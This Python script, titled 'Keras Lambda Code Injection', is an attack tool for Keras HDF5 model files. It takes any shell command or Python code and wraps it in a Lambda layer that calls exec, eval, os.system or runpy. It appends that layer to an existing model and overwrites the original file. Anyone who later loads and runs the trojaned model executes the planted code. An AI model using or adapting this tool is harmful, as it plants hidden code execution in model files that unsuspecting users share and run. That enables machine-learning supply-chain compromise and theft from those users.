import argparse
import os
import shutil
from pathlib import Path

import tensorflow as tf


@tf.keras.utils.register_keras_serializable()
def Exec(dummy, command_args):
    exec(command_args)


@tf.keras.utils.register_keras_serializable()
def Eval(dummy, command_args):
    eval(command_args)


@tf.keras.utils.register_keras_serializable()
def System(dummy, command_args):
    os.system(command_args)


@tf.keras.utils.register_keras_serializable()
def Runpy(dummy, command_args):
    import runpy
    runpy._run_code(command_args, {})


parser = argparse.ArgumentParser(description="Keras Lambda Code Injection")
parser.add_argument("path", type=Path, help="Path to the HDF5 model file")
parser.add_argument("command", choices=["system", "exec", "eval", "runpy"], help="Type of command to inject")
parser.add_argument("args", help="Arguments or code to inject")
parser.add_argument("--input_shape", type=int, nargs='+', help="Specify the input shape if it cannot be inferred")
parser.add_argument("-v", "--verbose", help="Verbose logging", action="count")
args = parser.parse_args()

command_args = args.args
if os.path.isfile(command_args):
    with open(command_args, "r") as in_file:
        command_args = in_file.read()

if args.command == "system":
    payload_name = "system_lambda"
    payload = tf.keras.layers.Lambda(System, name=payload_name, arguments={"command_args": command_args})
elif args.command == "exec":
    payload_name = "exec_lambda"
    payload = tf.keras.layers.Lambda(Exec, name=payload_name, arguments={"command_args": command_args})
elif args.command == "eval":
    payload_name = "eval_lambda"
    payload = tf.keras.layers.Lambda(Eval, name=payload_name, arguments={"command_args": command_args})
elif args.command == "runpy":
    payload_name = "runpy_lambda"
    payload = tf.keras.layers.Lambda(Runpy, name=payload_name, arguments={"command_args": command_args})

backup_path = f"{args.path}.bak"
shutil.copyfile(args.path, backup_path)

# Загрузка модели без компиляции
hdf5_model = tf.keras.models.load_model(args.path, compile=False)

if args.input_shape:
    input_shape = tuple(args.input_shape)
else:
    if hdf5_model.layers and hasattr(hdf5_model.layers[0], 'input_shape'):
        input_shape = hdf5_model.layers[0].input_shape[1:]
    else:
        raise ValueError(
            "Input shape cannot be inferred from the model. Please provide it manually with --input_shape.")

new_model = tf.keras.Sequential()
new_model.add(tf.keras.Input(shape=input_shape))

existing_layer_names = set()
for layer in hdf5_model.layers:
    if layer.name in existing_layer_names:
        layer._name = layer.name + "_copy"
    existing_layer_names.add(layer.name)
    new_model.add(layer)

if payload_name in existing_layer_names:
    payload._name = payload_name + "_unique"

new_model.add(payload)

new_model.save(args.path)

if args.verbose:
    print(f"Model modified and saved at: {args.path}. Backup saved at: {backup_path}")
